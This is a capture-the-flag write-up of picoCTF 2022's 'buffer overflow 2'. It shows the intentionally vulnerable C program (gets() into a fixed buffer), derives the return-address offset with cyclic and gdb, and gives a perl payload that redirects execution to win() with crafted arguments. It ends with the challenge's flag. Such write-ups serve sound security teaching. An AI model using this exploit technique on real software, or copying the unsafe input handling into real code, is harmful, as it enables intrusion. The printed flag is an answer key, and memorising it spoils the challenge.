---
layout: post
title: picoCTF 2022 - buffer overflow 2
date: "2023-05-03 20:00:31 +0100"
categories: [CTF-WRITEUPS, picoCTF - Binary exploitation]
tags: [c, pwn, binary exploitation, rev, gdb]
---

Hello friend,

In this post, we are going to be smashing the stack again, with the third challenge of **picoCTF 2022** , buffer overflow 2.

Link to the challenge : [buffer overflow 2
](https://play.picoctf.org/practice/challenge/259?page=1&search=buffer%20overflow)

## Description

Control the return address and arguments
This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/143/vuln)?
You can view source [here](https://artifacts.picoctf.net/c/143/vuln.c). And connect with it using nc saturn.picoctf.net <span style="color : red">[PORT]</span>

## Solution

<span style="color : red">vuln.c</span>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

#### Analyzing the program

Okey let's analyze the `vuln.c` program.

First, `main()` gets called, then we get asked for our input, then `vuln()` is called.

inside `vuln()` , a BUFFER is declared with a size of 100 bytes, and `gets()` is used to read from the standard input and stores that into the buffer.

This is the vulnerable part, since the program trusts the user input, we can exceed the buffer size and write into memory.

The idea here is to `JUMP` to the `win()` function.

In order to do so, we need to :

- Determine the exact number of bytes (offset) to overwrite the return address.
- Determine the address of the `win()` function.

#### Smashing the stack

Determining the address of `win` is fairly easy, here is how I've done it:

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ objdump -t ./vuln | grep win
08049296 g     F .text  000000a2              win
```

> Address : 0x08049296

This prints the symbol table of our program. Using grep allows us to only display the line that contains a pattern, in our case `win`.

Now we need to determine how many bytes we need to overwrite the return address in the stack.

Here is a simple illustration explaining the idea

<img src="/../assets/picoCTF_bufferoverflow2.png" />

Now if we control the return address, we can basically control the whole program and redirect it to wherever we want.

To determine how many bytes we need, we can generate a pattern using `cyclic` , feed it to the program and analyze it using `gdb`

let's generate a pattern of 120 bytes

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
```

Now let's open our binary in gdb, feeding it that input.

<img src="/../assets/picoCTF_bufferoverflow2.1.png" />

We are interested in the `EIP` register, since `EIP` points to the instruction that the CPU is going to execute.

As you can notice, EIP points to `daab`, which is a substring in our pattern, now we can easily determine the offset.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ cyclic -l daab
112
```

We got it ! Now we need exactly 112 bytes to hit the `EIP`.

Let's create a flag.txt file in our home directory in order to test the program.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ cat flag.txt
FLAG{yariss}
```

Now let's feed the program 112 chars + the address of `win`. I'm going to use `perl` for that.

> Note : we need to write the address in reverse, respecting the little endian byte order.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ perl -e 'print "A" x 112 . "\x96\x92\x04\x08" ' > payload
```

Now let's run it with gdb, make a breakpoint in the win function, and see if we hit it.

```bash
gdb ./vuln
b win
run < payload
```

We hit it !

Now that we can successfully jump to win, we need to somehow bypass the checks in order to print the flag.

```c
void win(unsigned int arg1, unsigned int arg2)
....
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
```

But how ? how can we set the arguments ?

Basically, when a function is called, here is what happens :

- the arguments of that function are pushed onto the stack
- the return address is pushed onto the stack
- a stack frame for the function is created

Now we need to craft the same stack structure, this way when we jump to our function, its arguments are those we've put into our crafted stack.

<img src="/../assets/picoCTF_bufferoverflow2.2.png" />

> Note : Don't forget to write the addresses / values in reverse order , respecting little endian format.

Putting all of this together, here is our final payload

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ perl -e 'print "A" x 112 . "\x96\x92\x04\x08" . "JUNK". "\x0d\xf0\xfe\xca" ."\x0d\xf0\x0d\xf0" . "\n" ' > payload
```

Let's run it.

```bash
└─$ cat payload | ./vuln
Please enter your string:
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�JUNK
FLAG{yariss}
```

We got it, now let's run it against the program in the server.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/picoCTF/buffer_overflow2]
└─$ cat payload | nc saturn.picoctf.net
picoCTF{argum3nt5_4_d4yZ_2a8ec317}
```

> Flag : picoCTF{argum3nt5_4_d4yZ_2a8ec317}
